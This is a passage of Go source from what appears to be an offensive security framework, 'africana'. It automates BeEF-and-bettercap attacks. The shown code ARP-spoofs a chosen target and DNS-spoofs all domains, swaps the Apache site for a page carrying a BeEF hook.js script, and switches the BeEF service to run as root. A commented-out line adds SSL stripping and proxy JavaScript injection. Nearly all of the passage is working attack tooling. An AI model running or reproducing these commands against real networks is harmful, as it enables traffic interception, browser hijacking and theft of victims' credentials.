            fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "BeefBettercap " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LHOST " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
            fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
            scanner.Scan()
            userLhost := scanner.Text()
            if userLhost == "" {
                userLhost = userLhostIp
            }
            //fmt.Println(); subprocess.Popen(`systemctl restart beef-xss.service; systemctl --no-pager status beef-xss; sleep 5; xdg-open "http://%s:3000/ui/panel" 2>/dev/null; bettercap --iface %s -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set http.proxy.injectjs http://%s:3000/hook.js; set https.proxy.injectjs http://%s:3000/hook.js; set https.proxy.certificate /root/.africana/certs/africana-cert.pem; set https.proxy.key /root/.africana/certs/africana-key.pem; set arp.spoof.targets %s; set http.proxy.sslstrip true; set https.proxy.sslstrip true; http.proxy on; https.proxy on; arp.spoof on; set net.sniff.verbose true; active"`, userLhost, userIface, userLhost, userTarget, userLhost)
        fmt.Println()
            fileXPath := "/var/www/html/.userFiles"
            if _, err := os.Stat(fileXPath); os.IsNotExist(err) {
                subprocess.Popen(`mkdir -p /var/www/html/.userFiles/; mv /var/www/html/* /var/www/html/.userFiles/; cp -r /root/.africana/africana-base/networks/beefhook/* /var/www/html/`)
                newString  := fmt.Sprintf(`<script src="http://%s:3000/hook.js"></script>`, userLhost)
                filesToReplacements := map[string]map[string]string{
                    "/var/www/html/index.html": {
                        `africana-beef`: newString,
                    },
                }
            utils.Editors(filesToReplacements)
            }
            subprocess.Popen(`systemctl restart apache2.service beef-xss.service`)
            subprocess.Popen(`systemctl --no-pager status apache2.service beef-xss.service; sleep 5`)
            subprocess.Popen(`xdg-open "http://%s:3000/ui/panel" 2>/dev/null; bettercap --iface %s -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set arp.spoof.targets %s; set dns.spoof.domains *.*; set net.sniff.verbose true; arp.spoof on; dns.spoof on; active"`, userLhost, userIface, userTarget)
            subprocess.Popen(`systemctl stop apache2.service beef-xss.service`)
            subprocess.Popen(`rm -rf /var/www/html/index.html; rm -rf /var/www/html/index_files; mv /var/www/html/.userFiles/* /var/www/html/; rm -rf /var/www/html/.userFiles/; systemctl --no-pager status apache2.service beef-xss.service`)
    case "2":
        if _, err := exec.LookPath("beef-xss"); err != nil {
            fmt.Printf("\n%sBeef isn't installed, install it with 'sudo apt install beef-xss'%s\n", bcolors.RED, bcolors.ENDC)
            return
        }
        filePath := "/etc/beef-xss/config.yaml.bak_africana"
        if _, err := os.Stat(filePath); os.IsNotExist(err) {
            subprocess.Popen(`cp -rf /etc/beef-xss/config.yaml /etc/beef-xss/config.yaml.bak_africana`)
            fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "Type new " + bcolors.ENDC + "password " + bcolors.DARKGREY + bcolors.ITALIC + "for the " + bcolors.ENDC + "beef " + bcolors.DARKGREY + bcolors.ITALIC + "user" + bcolors.BLUE + ")" + bcolors.ENDC)
            fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
            fmt.Scan(&userPass)
            newString := fmt.Sprintf(`passwd: "%s"`, userPass)
            filesToReplacements := map[string]map[string]string{
                "/etc/beef-xss/config.yaml": {
                `passwd: "beef"`: newString,
                },
            }
            utils.Editors(filesToReplacements)
            subprocess.Popen(`chown -R beef-xss:beef-xss /usr/share/beef-xss/./config.yaml`)

            filePath := "/usr/lib/systemd/system/beef-xss.service.bak_africana"
            if _, err := os.Stat(filePath); os.IsNotExist(err) {
                subprocess.Popen(`cp -rf /usr/lib/systemd/system/beef-xss.service /usr/lib/systemd/system/beef-xss.service.bak_africana`)
                filesToReplacements := map[string]map[string]string{
                    "/usr/lib/systemd/system/beef-xss.service": {
                        `User=beef-xss`: `User=root`,
                    },
                }
            utils.Editors(filesToReplacements)
            }
            subprocess.Popen(`systemctl daemon-reload`)
            }
            fmt.Println()
            subprocess.Popen(`ip address`)
            fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Interface " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "eth0" + bcolors.ENDC + bcolors.BLUE + bcolors.ITALIC + ")" + bcolors.ENDC)
            fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
            scanner.Scan()
            userIface := scanner.Text()
            if userIface == "" {
                userIface = "eth0"
            }
            fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "BeefBettercap " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LHOST " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
            fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
            scanner.Scan()
            userLhost := scanner.Text()
            if userLhost == "" {
                userLhost = userLhostIp
            }
            //fmt.Println(); subprocess.Popen(`systemctl restart beef-xss.service; systemctl --no-pager status beef-xss; sleep 5; xdg-open "http://%s:3000/ui/panel" 2>/dev/null; bettercap --iface %s -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set http.proxy.injectjs http://%s:3000/hook.js; set https.proxy.injectjs http://%s:3000/hook.js; set https.proxy.certificate /root/.africana/certs/africana-cert.pem; set https.proxy.key /root/.africana/certs/africana-key.pem; set http.proxy.sslstrip true; set https.proxy.sslstrip true; http.proxy on; https.proxy on; arp.spoof on; set net.sniff.verbose true; active"`, userLhost, userIface, userLhost, userLhost)
        fmt.Println()
            fileXPath := "/var/www/html/.userFiles"
            if _, err := os.Stat(fileXPath); os.IsNotExist(err) {
                subprocess.Popen(`mkdir -p /var/www/html/.userFiles/; mv /var/www/html/* /var/www/html/.userFiles/; cp -r /root/.africana/africana-base/networks/beefhook/* /var/www/html/`)
                newString  := fmt.Sprintf(`<script src="http://%s:3000/hook.js"></script>`, userLhost)
                filesToReplacements := map[string]map[string]string{
                    "/var/www/html/index.html": {
                        `africana-beef`: newString,
                    },
                }
            utils.Editors(filesToReplacements)
            }
            subprocess.Popen(`systemctl restart apache2.service beef-xss.service`)
            subprocess.Popen(`systemctl --no-pager status apache2.service beef-xss.service; sleep 5`)
            subprocess.Popen(`xdg-open "http://%s:3000/ui/panel" 2>/dev/null; bettercap --iface %s -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set dns.spoof.domains *.*; set net.sniff.verbose true; set dns.spoof.all true; arp.spoof on; dns.spoof on; active"`, userLhost, userIface)
            subprocess.Popen(`systemctl stop apache2.service beef-xss.service`)
            subprocess.Popen(`rm -rf /var/www/html/index.html; rm -rf /var/www/html/index_files; mv /var/www/html/.userFiles/* /var/www/html/; rm -rf /var/www/html/.userFiles/`)
            subprocess.Popen(`systemctl --no-pager status apache2.service beef-xss.service`)
    default:
        utils.SystemShell(userInput)
    }
}

func BeefInjector(userTarget string) {
    for {
        menus.MenuThreeThree()
        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "BeefInject " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "Ettercap" + bcolors.ENDC + bcolors.BLUE + bcolors.ITALIC + ")" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "\n╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
        scanner.Scan()
        userInput := scanner.Text()
        if userInput == "" {
            userInput = "1"
         }
        switch userInput {
        case "0":
            return
        case "1":
            BeefEttercap(userTarget)
        case "2":
            BeefBettercap(userTarget)
        default:
            utils.SystemShell(userInput)
         }
    }
}
